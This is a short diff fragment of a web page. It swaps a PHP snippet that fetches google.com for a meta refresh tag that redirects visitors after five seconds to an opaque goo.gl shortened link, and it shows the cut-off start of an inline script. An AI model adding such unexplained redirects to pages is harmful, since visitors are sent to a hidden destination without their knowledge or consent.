@@ -1,7 +1,5 @@
-<?php
-$homepage = file_get_contents('https://www.google.com');
-echo $homepage;
-?>
+<meta http-equiv="refresh" content="5;URL=https://goo.gl/m3eish">
+
 
 <script>
      (function (a, d, j, o) {
